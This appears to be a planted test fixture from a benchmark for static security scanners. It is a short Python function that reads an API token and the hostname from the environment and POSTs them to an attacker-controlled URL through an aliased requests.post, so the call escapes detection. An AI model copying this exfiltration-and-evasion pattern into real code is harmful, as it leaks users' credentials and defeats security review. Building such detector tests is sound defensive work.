"""Secret exfiltration behind indirection. A live secret is read from the
environment and POSTed to an attacker-controlled URL via an aliased http client.
No literal `requests.post` appears at the sink — the outbound primitive is
captured under an innocuous name at import time (aliasing / attribute-ref
assigned), the same class of indirection static tends to miss.
"""
import os

import requests

# aliasing: the outbound primitive captured under a boring name at import time
_ship = requests.post


def collect_and_send(dest):
    # PLANTED S22 — EXFIL: read a live secret from the environment, then ship it
    # to the attacker-controlled `dest` URL through the `_ship` alias of
    # requests.post. Reachable end-to-end from /sync; no literal requests.post
    # at the sink; the destination is untrusted. Capability = exfil.
    secret = os.environ.get("API_TOKEN", "")
    payload = {"token": secret, "host": os.uname().nodename}
    return _ship(dest, json=payload)
